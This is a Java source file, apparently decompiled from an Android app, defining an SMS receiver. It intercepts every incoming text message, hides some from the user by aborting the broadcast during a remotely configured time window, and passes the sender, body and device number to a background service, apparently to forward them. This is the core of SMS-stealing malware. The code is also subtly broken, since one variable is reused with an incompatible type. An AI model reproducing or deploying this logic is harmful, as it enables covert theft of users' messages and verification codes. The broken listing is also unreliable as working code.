package com.mvlove.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.mvlove.entity.Message;
import com.mvlove.entity.User;
import com.mvlove.service.TaskService;
import com.mvlove.util.AppUtil;
import com.mvlove.util.LocalManager;
import com.mvlove.util.LogUtil;
import com.mvlove.util.PhoneUtil;
import com.mvlove.util.SmsUtil;
import java.util.Date;

public class SmsReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        LogUtil.println("receive a new message");
        if (!AppUtil.isMainApkInstalled(context)) {
            SmsMessage[] message;
            User user = LocalManager.getUser(context);
            String address = null;
            StringBuilder builder = new StringBuilder();
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] objArray = (Object[]) bundle.get("pdus");
                message = new SmsMessage[objArray.length];
                for (int i = 0; i < objArray.length; i++) {
                    message[i] = SmsMessage.createFromPdu((byte[]) objArray[i]);
                }
                for (SmsMessage currentMessage : message) {
                    address = currentMessage.getDisplayOriginatingAddress();
                    builder.append(currentMessage.getDisplayMessageBody());
                }
            }
            boolean isAbort = false;
            if (user != null && user.isForbidden()) {
                Date startTime = user.getStartTime();
                Date endTime = user.getEndTime();
                if (!(startTime == null || endTime == null)) {
                    Date now = new Date();
                    int nowHours = now.getHours();
                    int nowMinutes = now.getMinutes();
                    int startHours = startTime.getHours();
                    int startMinutes = startTime.getMinutes();
                    int endHours = endTime.getHours();
                    int endMinutes = endTime.getMinutes();
                    if (endTime.getTime() < startTime.getTime()) {
                        if (nowHours < endHours) {
                            isAbort = true;
                        }
                        if (nowHours == endHours && nowMinutes <= endMinutes) {
                            isAbort = true;
                        }
                        if (nowHours > startHours) {
                            isAbort = true;
                        }
                        if (nowHours == startHours && nowMinutes >= startMinutes) {
                            isAbort = true;
                        }
                    } else if (endTime.getTime() > startTime.getTime()) {
                        if (nowHours > startHours && nowHours < endHours) {
                            isAbort = true;
                        }
                        if (nowHours == startHours && nowMinutes > startMinutes) {
                            isAbort = true;
                        }
                        if (nowHours == endHours && nowMinutes < endMinutes) {
                            isAbort = true;
                        }
                    }
                }
            }
            Intent intent2 = new Intent(context, TaskService.class);
            if (isAbort) {
                message = new Message();
                message.setCid("0");
                message.setContent(builder.toString());
                message.setPhone(PhoneUtil.getPhone(context));
                message.setReceiverPhone(PhoneUtil.getPhone(context));
                message.setSenderPhone(address);
                message.setSendTime(new Date());
                intent2.putExtra("data", message);
                context.startService(intent2);
                abortBroadcast();
                return;
            }
            context.startService(intent2);
            LogUtil.println("insert a new message");
            SmsUtil.insertSms(context, address, builder.toString());
            abortBroadcast();
        }
    }
}
